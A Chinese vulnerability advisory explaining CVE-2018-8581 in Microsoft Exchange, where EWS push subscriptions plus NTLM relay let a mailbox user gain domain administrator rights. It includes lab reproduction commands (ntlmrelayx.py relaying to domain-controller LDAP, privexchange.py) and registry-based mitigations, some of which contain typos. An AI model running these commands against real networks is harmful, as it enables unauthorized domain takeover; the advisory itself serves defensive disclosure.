***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **昨天，国外安全研究员 dirkjanm 通过博客文章公布了 Exchange 服务器上的一个提权漏洞的利用详情，漏洞编号为
CVE-2018-8581，实际上该漏洞早于去年 12 月份由 ZERO DAY INITIATIVE 组织发布的一篇技术博客中批露。该漏洞利用了
Exchange 服务器的 SSRF
和高权限的请求，导致拥有合法邮箱凭证的用户可以被提升至域管权限。目前，微软对该漏洞并未发布任何补丁，只提供了缓解该攻击的手法，但该方法也并不适用于所有的
Exchange 服务器。**

![](https://image.3001.net/images/20190123/15482244716353.jpg!small)

Exchange 服务器是由微软提供的邮件服务器，除了传统的邮件基本功能外，在微软背景下 Exchange
与活动目录域服务和其他微软相关服务和组件也有着众多联系。考虑到 Exchange
邮件服务器在企业环境中使用占比非常高，该漏洞影响范围也比较广，请用户及时采取相应的应对措施。

##  漏洞影响范围

Exchange 2010 ~ Exchange 2016

##  漏洞危害

攻击者通过已掌握的邮箱用户凭证，可以在一定条件下将普通用户提升至域管理员权限。

##  漏洞利用条件

Exchange 默认配置下，攻击者拥有合法的邮箱用户凭证，同时，该漏洞利用是通过 NTLM
重放的方式进行提权，因此攻击者需要已经在内网环境中取得可用主机。

##  漏洞简介

该漏洞的发生源于几个方面：

> 首先，Exchange 允许任意用户（只要是通过了认证的）通过 EWS 接口来创建一个推送订阅（Push Subscription），并可以指定任意
> URL 作为通知推送的目的地；
>
> 其次，通知被订阅推送后，当触发推送时，Exchange 使用了 CredentialCache 类的 DefaultCredentials 属性，由于
> EWS 以 SYSTEM 权限运行，当使用 DefaultCredentials 时发出的 HTTP 请求将使用该权限发起 NTLM 认证；
>
> 在 EWS 请求中，通过在 Header 中使用 SerializedSecurityContext，指定 SID
> 可以实现身份伪装，从而以指定用户身份进行 EWS 调用操作。

上述问题导致普通邮箱用户可以通过 EWS 高权限实现任意邮箱委托、查看等，这也是 ZDI 最先公布于博客中的漏洞详情。

由于该漏洞利用涉及 NTLM 的重放攻击，一种很容易想到的思路就是将该凭证重放到域控机器，这也是安全研究员 dirkjanm 在博客中提到的将 NTLM
重放到域控 LDAP 服务的利用方式。由于重放的 NTLM 凭证来自 Exchange
服务器的最高权限，利用该权限同时具备域内最高权限为普通用户进行提权操作。

##  漏洞复现

> 10.0.83.11 为攻击者
>
> 10.0.83.93 为域控服务器
>
> 10.0.83.94 为 Exchange 服务器

执行如下命令：

    
    
    ntlmrelayx.py -t ldap://10.0.83.93--escalate-user wangwu
    
    privexchange.py -ah 10.0.83.11 -u wangwu –ppassword --debug -d fb.com 10.0.83.94 –debug

![](https://image.3001.net/images/20190123/1548223906326.png!small)

ntlmrelayx.py 接收到请求，需要手动触发通知推送，或则等待该推送超时，可以看到 wangwu 提权成功为域管理员。

![图片 2.png](https://image.3001.net/images/20190123/15482277942375.png!small)

##  缓解措施

微软官方当时给出的缓解措施是，删除注册表中的一个键值 DisableLoopbackCheck：

    
    
     reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableLoopbackCheck /f    

从缓解攻击的角度出发，还可以在域控制器上启用 SMB 的签名校验，这是防范 NTLM 重放攻击较为有效的手法，具体如下：该种修复方式，实际上是限制了
NTLM 重放的，使得该种攻击利用得的一定的缓解。这种修复方式的缺陷在于，当 Exchange
服务器的角色被拆分安装，即，邮箱服务器角色和客户端访问服务器角色这两个服务器角色未被安装在同一台服务器上时，该种修复方式无效。  

HKEY_LOCAL_MACHIME\System\CurrentControlSet\Services\LanManServer\Paramete

参考上述注册表位置，添加 EnableSecuritySignature 和 RequireSecuritySignature，并设置其值为
1，重启操作系统。

<https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange>

[https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/?from=timeline&isappinstalled=0](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/?from=timeline&isappinstalled=0)

<https://www.freebuf.com/articles/web/193132.html>

<https://support.microsoft.com/zh-cn/help/161372/how-to-enable-smb-signing-in-windows-nt>

***本文作者：漏洞盒子，转载请注明来自FreeBuf.COM**

